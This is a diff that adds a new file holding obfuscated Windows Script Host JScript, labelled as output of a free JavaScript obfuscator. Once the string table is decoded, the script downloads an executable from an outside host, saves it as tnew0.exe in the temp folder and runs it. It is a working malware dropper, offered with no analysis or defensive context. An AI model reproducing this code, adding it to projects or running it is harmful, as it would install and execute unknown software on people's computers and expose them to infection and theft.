@@ -1,0 +1,8 @@
+/***************************************************************************/
+/*                                                                         */
+/*  This obfuscated code was created by Javascript Obfuscator Free Version.*/
+/*  Javascript Obfuscator Free Version can be downloaded here              */
+/*  http://javascriptobfuscator.com                                        */
+/*                                                                         */
+/***************************************************************************/
+var _$_f275=["http://jsh2.hitnet.co.kr/data/session/session/don.exe","WScript.Shell","CreateObject","Scripting.FileSystemObject","GetSpecialFolder","\\tnew0.exe","MSXML2.XMLHTTP","GET","open","send","Status","FileExists","DeleteFile","ADODB.Stream","Open","Type","ResponseBody","Write","Position","SaveToFile","Close","Run"];var url=_$_f275[0];var WshShell=WScript[_$_f275[2]](_$_f275[1]);var fso;fso=  new ActiveXObject(_$_f275[3]);var TemporaryFolder=2;var temp=fso[_$_f275[4]](TemporaryFolder);var filepath=temp+ _$_f275[5];var xhr= new ActiveXObject(_$_f275[6]);xhr[_$_f275[8]](_$_f275[7],url,false);xhr[_$_f275[9]]();if(xhr[_$_f275[10]]== 200){var fso= new ActiveXObject(_$_f275[3]);if(fso[_$_f275[11]](filepath)){fso[_$_f275[12]](filepath)};var stream= new ActiveXObject(_$_f275[13]);stream[_$_f275[14]]();stream[_$_f275[15]]= 1;stream[_$_f275[17]](xhr[_$_f275[16]]);stream[_$_f275[18]]= 0;stream[_$_f275[19]](filepath);stream[_$_f275[20]]();WshShell=  new ActiveXObject(_$_f275[1]);WshShell[_$_f275[21]](filepath,1,false)}
